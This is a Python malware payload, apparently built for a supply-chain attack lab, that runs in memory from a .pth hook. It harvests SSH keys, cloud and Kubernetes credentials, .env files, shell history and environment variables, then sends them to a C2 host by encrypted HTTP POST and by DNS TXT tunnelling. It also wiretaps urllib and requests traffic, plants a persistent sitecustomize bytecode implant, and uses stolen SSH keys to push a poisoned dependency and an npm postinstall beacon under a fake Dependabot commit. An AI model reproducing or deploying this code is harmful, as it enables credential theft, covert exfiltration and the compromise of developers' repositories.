"""Pathogen -- fileless in-memory payload served by C2.

Exec'd directly from the .pth hook via urllib. No disk artifacts.
Acts: steal -> wiretap -> survive -> spread.
"""

import base64, glob, hashlib, io, json, os, py_compile, socket, subprocess, sys, tarfile, tempfile, time, traceback, uuid
from urllib.request import Request, urlopen

# ---------------------------------------------------------------------------
# Config from environment
# ---------------------------------------------------------------------------
C2_URL = os.environ.get("C2_URL", "http://attacker-c2:9000")
DASHBOARD_URL = os.environ.get("DASHBOARD_URL", "http://dashboard:8000")
EVENTS_ENDPOINT = f"{DASHBOARD_URL}/api/events"
SOURCE = os.environ.get("PAYLOAD_SOURCE", "victim-1")
GIT_SERVER = os.environ.get("GIT_SERVER", "git-server")
GIT_REPO_PATH = os.environ.get("GIT_REPO_PATH", "/repos/internal-app.git")
POLYGLOT_MARKER = '"postinstall": "node scripts/postinstall.js"'
DNS_EXFIL_HOST = os.environ.get("DNS_EXFIL_HOST", "dns-exfil")
DNS_EXFIL_PORT = 53

RSA_PUBLIC_KEY_PEM = """\
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAs/Za0gIi5lxq6VvTE7Xz
8ITz75Kk3392Z/AlPVPFJm3+gUeaLrSMJDRuS9IK5A1queGD3Zd0k0A+hNvIH7Rd
Pu95myNmkmTpxKcQw3FELJVBM8ZLsfJ7foC/glIfSEmh20dv7hll2jm0TU9PyqKC
p4HP5R2NJ5wux7Fc7oQtnw4OjnXeTYv1VPHR6Rs2RYmgO8BpANmBeeIDSUlsgqVW
08KqvHc65fes3tfE12yOniHVkTMCFUHqS5UTknOrUiEqh0AyXJd6PekMZVITt6LI
AWLQGChvpA2+49GH/eLWwNpzdkLPi5k/E+GaCOWyy/iwdPgNmtrTsssYNY0oynUN
o1OCtqsLXCcTnvSojj0bXckJkmCl3OFXF6EDoIvTsCMRBzx8LQ7Ln+Iie6Du12FY
fS7/AUqrslOEeF/Djzq/O7TdFw9ph+MZcyQUjQstAhrNokOD2w6SR1ohjrJLZoFf
ZVJfTlTaOcyTE9LmsnUgtrCl8r4p6+7XKJ5vJ1aaJB0F5oNjqCjJsfO4qhiN7Biw
BOJOcN4rZ/uH+ntrHMSMgr4a+Ek23VbNK7lEcXrf4TbMDQoxk1Ro8PXujcCVWnuz
qGYycPbjq6AYf4jUZTymyxjEjbLqSo1jdWE17SO6obTZZCkmf+DEikg2vrbogOZT
i6cmR6KCAjR/4RnpSmu9zVcCAwEAAQ==
-----END PUBLIC KEY-----"""

# ---------------------------------------------------------------------------
# Reporter -- send events to dashboard in real-time
# ---------------------------------------------------------------------------
def report(event_type, data=None):
    payload = json.dumps({
        "type": event_type,
        "data": data or {},
        "timestamp": time.time(),
        "source": SOURCE,
    }).encode()
    req = Request(EVENTS_ENDPOINT, data=payload,
                  headers={"Content-Type": "application/json"}, method="POST")
    try:
        urlopen(req, timeout=3)
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Stage 1 -- Credential Harvesting
# ---------------------------------------------------------------------------
HARVEST_PATTERNS = [
    ("SSH Private Keys", ".ssh/id_*"),
    ("SSH Config", ".ssh/config"),
    ("AWS Credentials", ".aws/credentials"),
    ("AWS Config", ".aws/config"),
    ("Azure Tokens", ".azure/accessTokens.json"),
    ("GCP Credentials", ".config/gcloud/application_default_credentials.json"),
    ("Kubernetes Config", ".kube/config"),
    ("Environment Files", "**/.env"),
    ("Environment Files", "**/.env.*"),
    ("Git Config", ".gitconfig"),
    ("Shell History", ".bash_history"),
    ("Shell History", ".zsh_history"),
    ("NPM Config", ".npmrc"),
    ("Docker Config", ".docker/config.json"),
]

def stage_collect():
    report("stage1_start", {"message": "Beginning credential harvest"})
    home = os.path.expanduser("~")
    collected = {}
    for category, pattern in HARVEST_PATTERNS:
        full_pattern = os.path.join(home, pattern)
        for match in sorted(glob.glob(full_pattern, recursive=True)):
            rel = os.path.relpath(match, home)
            if rel in collected:
                continue
            try:
                with open(match, "rb") as f:
                    data = f.read()
                collected[rel] = data
                report("file_collected", {"path": f"~/{rel}", "category": category, "size": len(data)})
            except OSError:
                pass
    env_data = {k: v for k, v in os.environ.items() if not k.startswith("_") and k != "PATH"}
    report("env_collected", {"count": len(env_data), "keys": list(env_data.keys())[:20]})
    report("stage1_complete", {
        "files_count": len(collected),
        "total_bytes": sum(len(v) for v in collected.values()),
        "env_vars": len(env_data),
    })
    return collected, env_data

# ---------------------------------------------------------------------------
# Stage 2 -- Encrypt & Exfiltrate
# ---------------------------------------------------------------------------
def stage_exfiltrate(collected_files, env_data=None):
    report("stage2_start", {"message": "Beginning exfiltration"})
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w:gz") as tar:
        for rel_path, data in collected_files.items():
            info = tarfile.TarInfo(name=rel_path)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
        if env_data:
            env_json = json.dumps(env_data, indent=2).encode()
            info = tarfile.TarInfo(name="_env_vars.json")
            info.size = len(env_json)
            tar.addfile(info, io.BytesIO(env_json))
    tar_data = tar_buf.getvalue()
    report("tar_created", {"size": len(tar_data), "file_count": len(collected_files)})

    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as sym_padding

    aes_key = os.urandom(32)
    aes_iv = os.urandom(16)
    padder = sym_padding.PKCS7(128).padder()
    padded = padder.update(tar_data) + padder.finalize()
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded) + encryptor.finalize()

    report("aes_encrypted", {
        "key_hex": aes_key.hex(), "iv_hex": aes_iv.hex(),
        "plaintext_size": len(tar_data), "ciphertext_size": len(ciphertext),
    })

    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
    from cryptography.hazmat.primitives import hashes, serialization

    pub_key = serialization.load_pem_public_key(RSA_PUBLIC_KEY_PEM.encode())
    encrypted_key = pub_key.encrypt(
        aes_key + aes_iv,
        asym_padding.OAEP(mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                          algorithm=hashes.SHA256(), label=None),
    )
    report("rsa_encrypted", {"encrypted_key_size": len(encrypted_key)})

    payload = {
        "encrypted_key": base64.b64encode(encrypted_key).decode(),
        "iv": base64.b64encode(aes_iv).decode(),
        "data": base64.b64encode(ciphertext).decode(),
        "sha256": hashlib.sha256(ciphertext).hexdigest(),
        "hostname": os.environ.get("HOSTNAME", "unknown"),
        "source": SOURCE,
    }
    payload_json = json.dumps(payload).encode()
    report("payload_built", {"total_size": len(payload_json)})

    req = Request(f"{C2_URL}/exfil", data=payload_json,
                  headers={"Content-Type": "application/json"}, method="POST")
    try:
        resp = urlopen(req, timeout=10)
        report("exfil_complete", {"status": resp.status, "bytes_sent": len(payload_json)})
    except Exception as e:
        report("exfil_error", {"error": str(e)})


def _dns_exfil(env_data):
    """Exfiltrate env vars over DNS TXT queries -- stealthier than HTTP POST."""
    if not env_data:
        return
    report("dns_exfil_start", {"message": "Exfiltrating env vars via DNS TXT queries"})
    session_id = uuid.uuid4().hex[:8]
    raw = json.dumps(env_data).encode()
    encoded = base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    chunk_size = 50
    chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        target = (DNS_EXFIL_HOST, DNS_EXFIL_PORT)

        for idx, chunk in enumerate(chunks):
            qname = f"{idx}.{session_id}.{chunk}.exfil.pathogen.local"
            # Build minimal DNS query (type TXT = 16, class IN = 1)
            txn_id = os.urandom(2)
            flags = b"\x01\x00"  # standard query, recursion desired
            counts = b"\x00\x01\x00\x00\x00\x00\x00\x00"
            qbytes = b""
            for label in qname.split("."):
                qbytes += bytes([len(label)]) + label.encode()
            qbytes += b"\x00\x00\x10\x00\x01"  # null terminator + QTYPE TXT + QCLASS IN
            packet = txn_id + flags + counts + qbytes
            sock.sendto(packet, target)
            try:
                sock.recvfrom(512)
            except socket.timeout:
                pass
            report("dns_exfil_chunk_sent", {
                "session": session_id,
                "chunk": idx,
                "total_chunks": len(chunks),
            })
            time.sleep(0.05)

        # Send FIN
        fin_name = f"fin.{session_id}.exfil.pathogen.local"
        txn_id = os.urandom(2)
        qbytes = b""
        for label in fin_name.split("."):
            qbytes += bytes([len(label)]) + label.encode()
        qbytes += b"\x00\x00\x10\x00\x01"
        packet = txn_id + flags + counts + qbytes
        sock.sendto(packet, target)
        sock.close()

        report("dns_exfil_sent", {
            "session": session_id,
            "total_chunks": len(chunks),
            "total_bytes": len(raw),
        })
    except Exception as e:
        report("dns_exfil_error", {"error": str(e)})


# ---------------------------------------------------------------------------
# Stage 3 -- Runtime Interception + Bytecode Persistence
# ---------------------------------------------------------------------------
def _install_runtime_wiretap():
    patched = []
    _internal_urls = {EVENTS_ENDPOINT, f"{C2_URL}/exfil", f"{C2_URL}/stage"}
    try:
        import urllib.request as _ur
        original_urlopen = _ur.urlopen

        def hooked_urlopen(req, *args, **kwargs):
            target = getattr(req, "full_url", None) or str(req)
            if not any(target.startswith(u) for u in _internal_urls):
                method = getattr(req, "method", "GET")
                report("intercept_request_captured", {
                    "lib": "urllib",
                    "method": method,
                    "url": target,
                })
            return original_urlopen(req, *args, **kwargs)

        _ur.urlopen = hooked_urlopen
        patched.append("urllib")
    except Exception as e:
        report("intercept_hook_error", {"lib": "urllib", "error": str(e)})

    try:
        import requests as _requests
        original_request = _requests.sessions.Session.request

        def hooked_request(self, method, url, *args, **kwargs):
            report("intercept_request_captured", {
                "lib": "requests",
                "method": method.upper(),
                "url": url,
            })
            return original_request(self, method, url, *args, **kwargs)

        _requests.sessions.Session.request = hooked_request
        patched.append("requests")
    except Exception as e:
        report("intercept_hook_error", {"lib": "requests", "error": str(e)})

    report("intercept_hook_installed", {"patched_libraries": patched})


def _simulate_legit_traffic():
    report("intercept_simulation_start", {"message": "Simulating normal application API traffic"})
    try:
        urlopen(f"{C2_URL}/lab/internal?service=billing&op=list", timeout=5).read()
        req = Request(
            f"{C2_URL}/lab/internal",
            method="POST",
            data=json.dumps({"op": "charge", "amount": 4200, "currency": "usd"}).encode(),
            headers={"Content-Type": "application/json", "Authorization": "Bearer sk-demo-internal"},
        )
        urlopen(req, timeout=5).read()
    except Exception as e:
        report("intercept_simulation_error", {"error": str(e)})

    try:
        import requests as _requests
        _requests.get(f"{C2_URL}/lab/internal?service=users&op=profile", timeout=5)
        _requests.post(
            f"{C2_URL}/lab/internal",
            json={"op": "set_role", "user": "analyst", "role": "admin"},
            headers={"X-Internal-Token": "internal-token-demo"},
            timeout=5,
        )
    except Exception as e:
        report("intercept_simulation_error", {"error": str(e)})

    report("intercept_simulation_complete", {"message": "Wiretap captured application traffic"})


def _drop_pycache_implant():
    c2_stage = f"{C2_URL}/stage"
    cache_root = os.path.expanduser("~/.cache/pathogen/__pycache__")
    os.makedirs(cache_root, exist_ok=True)
    pyc_target = os.path.join(cache_root, f"sitecustomize.cpython-{sys.version_info.major}{sys.version_info.minor}.pyc")
    source_payload = (
        "import os\n"
        "from urllib.request import Request, urlopen\n"
        f"_u='{DASHBOARD_URL}/api/events'\n"
        "try:\n"
        f"  req=Request(_u,data=b'{{\"type\":\"pycache_implant_activated\",\"data\":{{}},\"source\":\"{SOURCE}\"}}',"
        "headers={'Content-Type':'application/json'},method='POST')\n"
        "  urlopen(req,timeout=2)\n"
        "except Exception:\n"
        "  pass\n"
        f"_='{c2_stage}'\n"
    )

    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as tf:
        tf.write(source_payload)
        temp_source = tf.name
    try:
        py_compile.compile(temp_source, cfile=pyc_target, doraise=True)
        report("pycache_persisted", {"path": pyc_target, "size": os.path.getsize(pyc_target)})
    finally:
        try:
            os.remove(temp_source)
        except OSError:
            pass


def stage_intercept_and_survive():
    report("stage3_start", {"message": "Installing import hooks and bytecode persistence"})
    _install_runtime_wiretap()
    _simulate_legit_traffic()
    try:
        _drop_pycache_implant()
    except Exception as e:
        report("pycache_persist_error", {"error": str(e)})
    report("stage3_complete", {"message": "Wiretap active; __pycache__ implant dropped"})

# ---------------------------------------------------------------------------
# Stage 4 -- Git Worm + Polyglot Escape
# ---------------------------------------------------------------------------
def stage_worm():
    report("stage4_start", {"message": "Initiating git worm + polyglot escape propagation"})

    home = os.path.expanduser("~")

    ssh_key = None
    for candidate in [".ssh/id_ed25519", ".ssh/id_rsa", ".ssh/id_ecdsa"]:
        full = os.path.join(home, candidate)
        if os.path.exists(full):
            ssh_key = full
            break

    if not ssh_key:
        report("stage4_complete", {"message": "No SSH keys found for worm propagation", "success": False})
        return

    report("worm_ssh_key_found", {"path": ssh_key})

    git_ssh_cmd = f"ssh -i {ssh_key} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
    env = {**os.environ, "GIT_SSH_COMMAND": git_ssh_cmd}

    clone_url = f"git@{GIT_SERVER}:{GIT_REPO_PATH}"
    work_dir = "/tmp/.pathogen-worm"
    repo_dir = os.path.join(work_dir, "internal-app")

    try:
        subprocess.run(["rm", "-rf", work_dir], capture_output=True)
        os.makedirs(work_dir, exist_ok=True)
        result = subprocess.run(
            ["git", "clone", clone_url, repo_dir],
            capture_output=True, text=True, env=env, timeout=15,
        )
        if result.returncode != 0:
            report("worm_clone_error", {"stderr": result.stderr[:500]})
            report("stage4_complete", {"message": "Clone failed", "success": False})
            return
        report("worm_repo_cloned", {"repo": clone_url})
    except Exception as e:
        report("worm_clone_error", {"error": str(e)})
        report("stage4_complete", {"message": "Clone failed", "success": False})
        return

    req_file = os.path.join(repo_dir, "requirements.txt")
    pkg_file = os.path.join(repo_dir, "package.json")
    scripts_dir = os.path.join(repo_dir, "scripts")
    postinstall_file = os.path.join(scripts_dir, "postinstall.js")
    try:
        existing = ""
        if os.path.exists(req_file):
            with open(req_file) as f:
                existing = f.read()

        already_py = "pyautoconf" in existing
        already_poly = False
        if os.path.exists(pkg_file):
            with open(pkg_file) as f:
                already_poly = POLYGLOT_MARKER in f.read()

        if already_py and already_poly:
            report("worm_already_infected", {"file": req_file})
            report("stage4_complete", {"message": "Repo already infected", "success": True})
            return

        if not already_py:
            with open(req_file, "a") as f:
                f.write("pyautoconf>=4.3.0\n")
            report("worm_requirements_modified", {"file": "requirements.txt", "added": "pyautoconf>=4.3.0"})

        os.makedirs(scripts_dir, exist_ok=True)
        if not os.path.exists(pkg_file):
            with open(pkg_file, "w") as f:
                f.write(
                    '{\n'
                    '  "name": "internal-app",\n'
                    '  "version": "1.0.0",\n'
                    '  "private": true,\n'
                    '  "scripts": {\n'
                    '    "start": "node app.js"\n'
                    "  }\n"
                    "}\n"
                )

        with open(pkg_file) as f:
            pkg = f.read()
        if POLYGLOT_MARKER not in pkg:
            if '"scripts": {' in pkg and '"start": "node app.js"' in pkg:
                pkg = pkg.replace(
                    '"start": "node app.js"',
                    '"start": "node app.js",\n    "postinstall": "node scripts/postinstall.js"',
                )
            else:
                pkg = (
                    '{\n'
                    '  "name": "internal-app",\n'
                    '  "version": "1.0.0",\n'
                    '  "private": true,\n'
                    '  "scripts": {\n'
                    '    "postinstall": "node scripts/postinstall.js"\n'
                    "  }\n"
                    "}\n"
                )
            with open(pkg_file, "w") as f:
                f.write(pkg)
            report("worm_polyglot_seeded", {"file": "package.json", "script": "postinstall"})

        if not os.path.exists(postinstall_file):
            with open(postinstall_file, "w") as f:
                f.write(
                    "const http = require('http');\n"
                    "const payload = JSON.stringify({\n"
                    "  source: process.env.HOSTNAME || 'node-host',\n"
                    "  event: 'polyglot_escape',\n"
                    "  packageManager: 'npm',\n"
                    "  note: 'Node postinstall reached from Python worm'\n"
                    "});\n"
                    "const req = http.request({\n"
                    "  hostname: process.env.POLYGLOT_C2_HOST || 'attacker-c2',\n"
                    "  port: 9000,\n"
                    "  path: '/polyglot',\n"
                    "  method: 'POST',\n"
                    "  headers: {'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload)}\n"
                    "}, (res) => { process.stdout.write('polyglot:' + res.statusCode + '\\n'); });\n"
                    "req.on('error', () => process.exit(0));\n"
                    "req.write(payload);\n"
                    "req.end();\n"
                )
    except Exception as e:
        report("worm_modify_error", {"error": str(e)})
        report("stage4_complete", {"message": "Failed to modify requirements", "success": False})
        return

    try:
        subprocess.run(["git", "config", "user.email", "bot@internal.dev"],
                       cwd=repo_dir, capture_output=True, env=env)
        subprocess.run(["git", "config", "user.name", "Dependabot"],
                       cwd=repo_dir, capture_output=True, env=env)
        subprocess.run(["git", "add", "requirements.txt", "package.json", "scripts/postinstall.js"],
                       cwd=repo_dir, capture_output=True, env=env)
        commit = subprocess.run(
            ["git", "commit", "-m", "chore: sync dependency metadata"],
            cwd=repo_dir, capture_output=True, text=True, env=env,
        )
        if commit.returncode != 0:
            report("worm_commit_error", {"stderr": commit.stderr[:500]})
            report("stage4_complete", {"message": "Commit failed", "success": False})
            return

        commit_hash = subprocess.run(
            ["git", "rev-parse", "--short", "HEAD"],
            cwd=repo_dir, capture_output=True, text=True, env=env,
        ).stdout.strip()

        push = subprocess.run(
            ["git", "push", "origin", "main"],
            cwd=repo_dir, capture_output=True, text=True, env=env, timeout=15,
        )
        if push.returncode != 0:
            report("worm_push_error", {"stderr": push.stderr[:500]})
            report("stage4_complete", {"message": "Push failed", "success": False})
            return

        report("worm_push_success", {"commit": commit_hash, "branch": "main"})
    except Exception as e:
        report("worm_git_error", {"error": str(e)})
        report("stage4_complete", {"message": "Git operation failed", "success": False})
        return

    subprocess.run(["rm", "-rf", work_dir], capture_output=True)
    report("stage4_complete", {"message": "Worm + polyglot propagation complete", "repos_poisoned": 1, "success": True})

# ---------------------------------------------------------------------------
# Main -- orchestrate all stages
# ---------------------------------------------------------------------------
def run():
    report("payload_start", {"message": ".pth triggered -- fileless payload executing in memory"})
    time.sleep(0.3)

    collected_files, env_data = stage_collect()
    stage_exfiltrate(collected_files, env_data)
    _dns_exfil(env_data)
    stage_intercept_and_survive()
    stage_worm()

    report("payload_complete", {"message": "All stages complete"})

try:
    run()
except Exception:
    tb = traceback.format_exc()
    report("payload_error", {"traceback": tb})
    print(f"[payload error] {tb}", file=sys.stderr)
